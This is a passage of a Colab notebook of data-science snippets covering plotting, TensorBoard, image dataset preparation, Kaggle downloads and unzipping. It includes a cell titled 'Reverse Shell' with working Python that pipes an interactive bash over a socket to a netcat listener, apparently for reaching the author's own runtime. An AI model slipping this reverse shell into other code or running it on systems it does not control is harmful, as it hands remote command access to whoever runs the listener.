        "import pandas as pd\n",
        "import sqlite3\n",
        "\n",
        "conn = sqlite3.connect('database.sqlite')\n",
        "df = pd.read_sql_query(\"select * from table;\", conn)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Tj43suTjziF_",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] Seaborn - Histogram plot (distplot)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "SVvfvj870VQa",
        "colab_type": "text"
      },
      "source": [
        "displot\n",
        "\n",
        "https://seaborn.pydata.org/generated/seaborn.distplot.html"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "69dHxTbozm2e",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import seaborn as sns\n",
        "\n",
        "sns.distplot(df['columns'])"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "TKmtcwkF0CHp",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] Seaborn - Pair plot"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "_hrsFpIr0HEh",
        "colab_type": "text"
      },
      "source": [
        "Ploting distribution and scratter\n",
        "\n",
        "https://seaborn.pydata.org/generated/seaborn.pairplot.html"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8VsDBS9j0OFb",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import seaborn as sns\n",
        "\n",
        "sns.pairplot(df)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "sOyjZMqZB439",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] Seaborn - Scratter Plot"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Om4_ZfpxCC-Q",
        "colab_type": "text"
      },
      "source": [
        "https://seaborn.pydata.org/generated/seaborn.scatterplot.html"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "sla8CIzzB80F",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import seaborn as sns\n",
        "\n",
        "sns.scatterplot(x=df['x'], y=df['y'], hue=df['class'])"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "IA2aWDVexkOG",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] Tensor Board"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "K5YRFpVpxxLw",
        "colab_type": "text"
      },
      "source": [
        "https://www.tensorflow.org/tensorboard/get_started"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "RgDHho5ZxpRl",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "%load_ext tensorboard\n",
        "! rm -rf ./logs/ "
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "J7UnX2jFxwwi",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import datetime\n",
        "log_dir = \"logs/fit/\" + datetime.datetime.now().strftime(\"%Y%m%d-%H%M%S\")\n",
        "tensorboard_callback = tf.keras.callbacks.TensorBoard(log_dir=log_dir, histogram_freq=1)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "O0XnQzXJ2nxO",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "%tensorboard --logdir logs/fit"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ec1VfN6u-72I",
        "colab_type": "text"
      },
      "source": [
        "# 1[Function] Create directory for image classification task"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "HxOxlTYH_SuP",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "file_path = '/content/'"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "TZyQ05l5_VX3",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "train_path = file_path + 'train/'\n",
        "validate_path = file_path + 'validate/'\n",
        "test_path = file_path + 'test/'"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "fXaBnr8q_CWC",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import os\n",
        "\n",
        "os.mkdir(train_path)\n",
        "os.mkdir(validate_path)\n",
        "os.mkdir(test_path)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "XLc1G6Lg1GmO",
        "colab_type": "text"
      },
      "source": [
        "# 1[Function] Download images from ImageNet"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2bwCWLOf1lmX",
        "colab_type": "text"
      },
      "source": [
        "For Image classification Task"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "d269jOE81MFv",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import requests\n",
        "import urllib\n",
        "import cv2\n",
        "import numpy as np\n",
        "\n",
        "def downloadImageFromURL(url: str, save_path: str):\n",
        "    response = urllib.request.urlopen(url)\n",
        "    image_byte = np.asarray(bytearray(response.read()), dtype=\"uint8\")\n",
        "    image = cv2.imdecode(image_byte, cv2.IMREAD_COLOR)\n",
        "    if (len(image.shape)) == 3 :\n",
        "        cv2.imwrite(save_path, image)\n",
        "        return True\n",
        "    else :\n",
        "        return False\n",
        "\n",
        "def donwloadImageFromImageNetURL(url: str, file_path: str, class_name: str, qualtity: int, start_point:int = 0) :\n",
        "    req_result = requests.get(url).content.decode('utf-8').split('\\r\\n')\n",
        "    os.mkdir(file_path + class_name)\n",
        "    count = 1\n",
        "    current_point = start_point\n",
        "    while True :\n",
        "        if count == qualtity + 1 :\n",
        "            break\n",
        "        try : \n",
        "            download_status = downloadImageFromURL(req_result[current_point], file_path + class_name + '/' + f'img_{count}.jpg')\n",
        "            if download_status :\n",
        "                count += 1 \n",
        "            current_point += 1\n",
        "        except :\n",
        "            current_point += 1\n",
        "    print(f'downloaded class : {class_name}')\n",
        "    print(f'qualtity : {qualtity}')\n",
        "    print(f'download count  : {count - 1}')\n",
        "    print(f'start point  : {start_point}')\n",
        "    print(f'end point  : {current_point}')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "EmImEXr6-nHg",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "images_quatity = 100\n",
        "donwloadImageFromImageNetURL('http://www.image-net.org/api/text/imagenet.synset.geturls?wnid=....', train_or_test_path, 'class_name', images_quatity)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "X7ufL2Tc1ct2",
        "colab_type": "text"
      },
      "source": [
        "# 1[Function] Download Image from any URL"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "lnpwQgl1hrKG",
        "colab_type": "text"
      },
      "source": [
        "eg.\n",
        "\n",
        "save_path = '/content/file_name.jpg"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "l5B4kh9W1hPG",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import urllib\n",
        "import cv2\n",
        "import numpy as np\n",
        "\n",
        "def downloadImageFromURL(url: str, save_path: str):\n",
        "    response = urllib.request.urlopen(url)\n",
        "    image_byte = np.asarray(bytearray(response.read()), dtype=\"uint8\")\n",
        "    image = cv2.imdecode(image_byte, cv2.IMREAD_COLOR)\n",
        "    if (len(image.shape)) == 3 :\n",
        "        cv2.imwrite(save_path, image)\n",
        "        return True\n",
        "    else :\n",
        "        return False"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "RJR-m75nqxDu",
        "colab_type": "text"
      },
      "source": [
        "# 1[Prep] Create folder for Image Classification"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "dGK9Cnbnq2y2",
        "colab_type": "text"
      },
      "source": [
        "Create folder for image classification"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "znGWA8yeq6fc",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import os\n",
        "\n",
        "work_path = '/content/'\n",
        "train_path = work_path + 'train/'\n",
        "validate_path = work_path + 'validate/'\n",
        "test_path = work_path + 'test/'\n",
        "os.mkdir(train_path)\n",
        "os.mkdir(validate_path)\n",
        "os.mkdir(test_path)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "JYtU6csispT1",
        "colab_type": "text"
      },
      "source": [
        "# 1[Prep] Checking class and file in directory"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2jnuKe3VsyXo",
        "colab_type": "text"
      },
      "source": [
        "For image classification task"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "k4pdGDzFs1KE",
        "colab_type": "code",
        "cellView": "form",
        "colab": {}
      },
      "source": [
        "#@title Function : directoryClassCheck\n",
        "\n",
        "import os\n",
        "import glob\n",
        "\n",
        "def directoryClassCheck(work_path: str, ext_file:str = '') :\n",
        "    dir_class = os.listdir(work_path)\n",
        "    for d_class in dir_class :\n",
        "        print('Class : %s -> (%s files)'%(d_class, len([f for f in glob.glob(work_path + '%s/*%s'%(d_class, ext_file))])))"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "mrtw7_uMhwkO",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "directoryClassCheck(path, ext_file='')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "VvsPkOx7t7y6",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] Image data generator"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "zKugcicDupgW",
        "colab_type": "text"
      },
      "source": [
        "Parametres :\n",
        "\n",
        "*   train_valid_test_path\n",
        "*   image_height\n",
        "*   image_width\n",
        "*   BATCH_SIZE\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "s-n9ObvopzjM",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "ImgDatagenProperty = {\n",
        "    'rescale' : 1/255,\n",
        "    'rotation_range' : 10,\n",
        "    'width_shift_range' : 0.1,\n",
        "    'height_shift_range' : 0.1,\n",
        "    'shear_range' : 0.1,\n",
        "    'zoom_range' : 0.1,\n",
        "}"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "sgFgxioVqqXO",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "ImgModelProperty = {\n",
        "    'img_height' : 227,\n",
        "    'img_width' : 227,\n",
        "    'num_class' : 2,\n",
        "    'epoch' : 100,\n",
        "    'batch_size' : 32,\n",
        "}"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "IBgPNrWZt_Mv",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import tensorflow as tf\n",
        "\n",
        "_datagen = tf.keras.preprocessing.image.ImageDataGenerator(\n",
        "                    rescale=ImgDatagenProperty['rescale'],\n",
        "                    rotation_range=ImgDatagenProperty['rotation_range'],\n",
        "                    width_shift_range=ImgDatagenProperty['width_shift_range'],\n",
        "                    height_shift_range=ImgDatagenProperty['height_shift_range'],\n",
        "                    shear_range=ImgDatagenProperty['shear_range'],\n",
        "                    zoom_range=ImgDatagenProperty['zoom_range']).flow_from_directory(train_valid_test_path,\n",
        "                        target_size=(ImgModelProperty['img_width'], ImgModelProperty['img_width']),\n",
        "                        color_mode='rgb',\n",
        "                        batch_size=ImgModelProperty['batch_size'],\n",
        "                        seed=5555,\n",
        "                        shuffle=True,\n",
        "                        class_mode='categorical')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "xbVsmIvGst1O",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] Select TensorFlow version 1"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xuptQFkns0KH",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "%tensorflow_version 1.x"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UlnOxX-_1Pss",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] Convert Library to TensorFlow 2"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "QkfLRJxn1czT",
        "colab_type": "text"
      },
      "source": [
        "Library_Path : Path to Library (Folder)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "iaI0QJCF1Uij",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! tf_upgrade_v2 --intree <Library_Path> --inplace --reportfile report.txt"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "QjJbZDOF2alZ",
        "colab_type": "text"
      },
      "source": [
        "# 1[Colab] Download file"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ApSffVeE2g3b",
        "colab_type": "text"
      },
      "source": [
        "Parameters : file_path"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ayJJDi9k2d5R",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from google.colab import files\n",
        "\n",
        "files.download(file_path)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "j-eyR5c24M4I",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] Plot Model"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "KGxtqgSW4TlY",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import tensorflow as tf\n",
        "\n",
        "tf.keras.utils.plot_model(model, to_file='model.png')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "dsXopXqXh9YN",
        "colab_type": "text"
      },
      "source": [
        "# 1[Prep] Image Train/Validate/Test Split"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "sNpFch3aiD_g",
        "colab_type": "code",
        "cellView": "form",
        "colab": {}
      },
      "source": [
        "#@title Function : imageClassTrainValidationTestSplit\n",
        "#@markdown Train / Validation / Test split for image task\n",
        "\n",
        "import os \n",
        "import glob\n",
        "import random\n",
        "import math\n",
        "import shutil\n",
        "from tqdm.notebook import tqdm\n",
        "\n",
        "def imageClassTrainValidationTestSplit(img_path:str, className:str, trainPath:str, validationPath:str, testPath:str, file_ext:str = '.jpg', shuffle:bool = True, random_seed:int =5555, validationRatio:float = 0.05, testRatio:float = 0.1) :\n",
        "    src_file = glob.glob(img_path + '*%s'%(file_ext))\n",
        "    src_file_len = len(src_file)\n",
        "\n",
        "    if not(os.path.exists(trainPath + className +'/')) :\n",
        "        os.mkdir(trainPath + className +'/')\n",
        "\n",
        "    if not(os.path.exists(validationPath + className +'/')) :\n",
        "        os.mkdir(validationPath + className +'/')\n",
        "\n",
        "    if not(os.path.exists(testPath + className +'/')) :\n",
        "        os.mkdir(testPath + className +'/')\n",
        "\n",
        "    if validationRatio > 1.0 or validationRatio < 0.0 :\n",
        "        raise ValueError('ValidationRatio should less than 1 and more than 0')\n",
        "\n",
        "    if testRatio > 1.0 or testRatio < 0.0 :\n",
        "        raise ValueError('testRatio should less than 1 and more than 0')\n",
        "\n",
        "    if (testRatio + validationRatio) > 1 :\n",
        "        raise ValueError('testRatio + validationRatio should less than 1')\n",
        "\n",
        "    validation_count = math.floor(src_file_len * validationRatio)\n",
        "    test_count = math.floor(src_file_len * testRatio)\n",
        "    train_count = src_file_len - (validation_count + test_count)\n",
        "    print('Class : ' + className)\n",
        "    print('Train count : ' + str(train_count))\n",
        "    print('Validation count  : ' + str(validation_count))\n",
        "    print('Test count : ' + str(test_count))\n",
        "\n",
        "    if shuffle :\n",
        "        random.seed(random_seed)\n",
        "        random.shuffle(src_file)\n",
        "\n",
        "    for _ in tqdm(src_file) :\n",
        "        file_name = os.path.split(_)[1]\n",
        "        if validation_count > 0 :\n",
        "            shutil.copyfile(_, validationPath + className +'/' + file_name)\n",
        "            validation_count -= 1\n",
        "\n",
        "        elif test_count > 0 :\n",
        "            shutil.copyfile(_, testPath + className +'/' + file_name)\n",
        "            test_count -= 1\n",
        "\n",
        "        else :\n",
        "            shutil.copyfile(_, trainPath + className +'/' + file_name)\n",
        "\n",
        "    return True"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "JekvP5VKiZMn",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "imageClassTrainValidationTestSplit(img_path, 'class_name', train_path, validate_path, test_path, file_ext= '.jpg', shuffle= True, random_seed=5555, validationRatio= 0.05, testRatio= 0.1)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "p4jC5K1y-JNM",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] Display image in grid from Train/Test/Validate Path with Class Name"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "hxVznhzq-Qxh",
        "colab_type": "text"
      },
      "source": [
        "Display image in grid from Train/Test/Validate Path with Class Name"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zvbWux5d-Pzw",
        "colab_type": "code",
        "cellView": "form",
        "colab": {}
      },
      "source": [
        "#@title Function : Display image in grid from Train/Test/Validate Path with Class Name\n",
        "\n",
        "import glob\n",
        "import math\n",
        "import random\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "def displayOriginalImageWithClass(primary_path: str, class_name: str, file_ext:str ='.jpg', max_file:int = None, shuffle:bool = False, random_seed: int=55555) :  \n",
        "    ee_path = primary_path + class_name + '/'\n",
        "    src_file = glob.glob(ee_path + '*%s'%(file_ext))\n",
        "\n",
        "    if shuffle :\n",
        "        random.seed(random_seed)\n",
        "        random.shuffle(src_file)\n",
        "\n",
        "    if max_file != None :\n",
        "        src_file = src_file[:max_file]\n",
        "\n",
        "    img_col = 4\n",
        "    img_row = math.ceil(len(src_file)/img_col)\n",
        "\n",
        "\n",
        "    fig = plt.figure(figsize=(10, 3*img_row))\n",
        "    fig.subplots_adjust(left=0, right=1, bottom=0, top=1, hspace=0.05, wspace=0.05)\n",
        "\n",
        "    for i in range(len(src_file)):\n",
        "        ax = fig.add_subplot(img_row, img_col, i + 1, xticks=[], yticks=[])\n",
        "        ax.imshow(plt.imread(src_file[i], ))\n",
        "        ax.text(3, 17, class_name, color='blue', fontsize=14)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-8JH1n3i-Uxz",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "displayOriginalImageWithClass(train_val_test_path, 'class_name', file_ext='.jpg', max_file=None, shuffle = False, random_seed =55555)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "bIuWMv5JWbey",
        "colab_type": "text"
      },
      "source": [
        "# 1[Function] Stat - Detect Outlier with IQR"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "rKvLh-UXWiKP",
        "colab_type": "code",
        "cellView": "form",
        "colab": {}
      },
      "source": [
        "#@title Function : findOutlierBound\n",
        "import pandas as pd\n",
        "\n",
        "def findOutlierBound(sr:pd.Series) :\n",
        "    q3 = sr.quantile(q=0.75)\n",
        "    q2 = sr.quantile(q=0.50)\n",
        "    q1 = sr.quantile(q=0.25)\n",
        "    iqr = q3-q1\n",
        "    upper = q3 + (1.5*iqr)\n",
        "    lower = q1 - (1.5*iqr)\n",
        "    return {\n",
        "        'q3' : q3,\n",
        "        'q2' : q2,\n",
        "        'q1' : q1,\n",
        "        'iqr' : iqr,\n",
        "        'upper' : upper,\n",
        "        'lower' : lower,\n",
        "    }"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cmnAdS-mWhw_",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "outlier_bound = findOutlierBound(series)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Y4La99ceWzwv",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] Seaborn - Box Plot\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "lzj4yaWfXHPv",
        "colab_type": "text"
      },
      "source": [
        "https://seaborn.pydata.org/generated/seaborn.boxplot.html"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "WPYX3hexW_6g",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import seaborn as sns\n",
        "\n",
        "sns.boxplot(x=temp2_nn_df[\"Exposure_Time\"])"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4obKnmD2pgsA",
        "colab_type": "text"
      },
      "source": [
        "# 1[PT] Seed Everything function"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "tjfUjcghpmNH",
        "colab_type": "text"
      },
      "source": [
        "https://www.kaggle.com/yutanakamura/dear-pytorch-lovers-bert-transformers-lightning"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "P8objc9kpnyu",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import random\n",
        "import os\n",
        "import numpy as np\n",
        "import torch\n",
        "\n",
        "def seed_everything(seed=55555) :\n",
        "    random.seed(seed)\n",
        "    os.environ['PYTHONHASHSEED'] = str(seed)\n",
        "    np.random.seed(seed)\n",
        "    torch.manual_seed(seed)\n",
        "    torch.cuda.manual_seed(seed)\n",
        "    torch.backends.cudnn.deterministic = True"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xSwgokBFp3lP",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "seed_everything(seed=55555)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "c0iMl-kuq_RA",
        "colab_type": "text"
      },
      "source": [
        "# 1[Colab] Data Table"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "gaQEkNjdrCMO",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "%load_ext google.colab.data_table\n",
        "from google.colab.data_table import DataTable\n",
        "DataTable.min_width = '0' \n",
        "\n",
        "df"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "DsHZ1pVc_nxX",
        "colab_type": "text"
      },
      "source": [
        "# 1[Colab] Proxy port + HTTP server"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Hw6eEeTY_xlD",
        "colab_type": "text"
      },
      "source": [
        "Getting URL"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "vmFYvXnr_sw3",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from google.colab.output import eval_js\n",
        "eval_js(\"google.colab.kernel.proxyPort(8000)\")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ObJVDiRE_z7q",
        "colab_type": "text"
      },
      "source": [
        "Start Server"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "vzhFGm9l_urF",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! python -m http.server 8000 "
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "tdCJfrR3Bo3Y",
        "colab_type": "text"
      },
      "source": [
        "# 1[Colab] Reverse Shell"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "lWyaQ5kJB_Ko",
        "colab_type": "text"
      },
      "source": [
        "Login to server with Public IP and run this command\n",
        "\n",
        "```\n",
        "$ nc -lv 13337\n",
        "```\n",
        "\n",
        "13337 is port number that can change to any number what you want."
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "rM2iz9AQBrhb",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import socket, subprocess, os\n",
        "\n",
        "server_ip = '127.0.0.1'\n",
        "port_number = 13337\n",
        "\n",
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
        "s.connect((server_ip, port_number))\n",
        "os.dup2(s.fileno(),0)\n",
        "os.dup2(s.fileno(),1)\n",
        "os.dup2(s.fileno(),2)\n",
        "\n",
        "p = subprocess.call(['/bin/bash','-i'])"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "pJC9VWypYGCK",
        "colab_type": "text"
      },
      "source": [
        "# 1[Function]* Kaggle : Download dataset"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Zr68wjevYpug",
        "colab_type": "text"
      },
      "source": [
        "Parametres : \n",
        "\n",
        "KAGGLE_USERNAME : kaggle username\n",
        "\n",
        "KAGGLE_KEY : kaggle key\n",
        "\n",
        "dataset/dataset : dataset to download\n",
        "\n",
        "filename.zip : downloaded file name"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "n27w6inUYWYA",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! pip install kaggle"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "19yQLVbpYUV-",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import os\n",
        "os.environ['KAGGLE_USERNAME'] = 'xxxx' # username from the json file\n",
        "os.environ['KAGGLE_KEY'] = 'xxxx' # key from the json file"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "K0mwlt3NYPGj",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! kaggle datasets download -d dataset/dataset"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "0idH8MqSZZGk",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! unzip dataset.zip"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "CIpHBGBjY62H",
        "colab_type": "text"
      },
      "source": [
        "# 1[Function]* Kaggle : Competition List"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "AcCconEAZClP",
        "colab": {}
      },
      "source": [
        "! pip install kaggle"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "3XPqLIh8ZClV",
        "colab": {}
      },
      "source": [
        "import os\n",
        "os.environ['KAGGLE_USERNAME'] = 'xxxx' # username from the json file\n",
        "os.environ['KAGGLE_KEY'] = 'xxxx' # key from the json file"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "MB3vxTMyZDOn",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! kaggle competitions list"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LujpGc9st6Eg",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Unzip : *.zip"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "SNjYueFyt-il",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! unzip file.zip"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2hY6cnA_uJnm",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Unzip : *.tar"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "St_3qWlbuvsP",
        "colab_type": "text"
      },
      "source": [
        "Use -C option to specify path to unzip\n",
        "\n",
        "```\n",
        "! tar -xvf file.tar -C 'content/cell_images'\n",
        "```\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "uhWBYgETuOpp",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! tar -xvf file.tar -C 'content/cell_images'"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "0ge5X0kNvIFX",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Unzip : *.tar.gz"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7kJu3PnIvRgq",
        "colab_type": "text"
      },
      "source": [
        "Use -C option to specify path to unzip\n",
        "\n",
        "```\n",
        "! tar -xvf file.tar -C 'content/cell_images'\n",
        "```\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Bw3RccbxvMnX",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! tar -xvfz file.tar.gz"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wjTg7aOLubey",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Unzip function"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "AarVX8OwumIn",
        "colab_type": "text"
      },
      "source": [
        "shutil.unpack_archive works with almost all archive formats (e.g., “zip”, “tar”, “gztar”, “bztar”, “xztar”) and it's simple:"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zpjDIO9SuiB3",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import shutil\n",
        "shutil.unpack_archive('filename', 'path_to_extract')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
